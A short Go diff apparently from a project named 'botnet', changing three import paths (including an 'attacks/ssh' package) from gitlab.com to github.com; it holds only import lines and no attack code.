@@ -5,9 +5,9 @@ import (
 	"fmt"
 	"time"
 
-	"gitlab.com/rodzzlessa24/botnet/attacks/ssh"
-	"gitlab.com/rodzzlessa24/botnet/client"
-	"gitlab.com/rodzzlessa24/botnet/server"
+	"github.com/rodzzlessa24/botnet/attacks/ssh"
+	"github.com/rodzzlessa24/botnet/client"
+	"github.com/rodzzlessa24/botnet/server"
 )
 
 func main() {
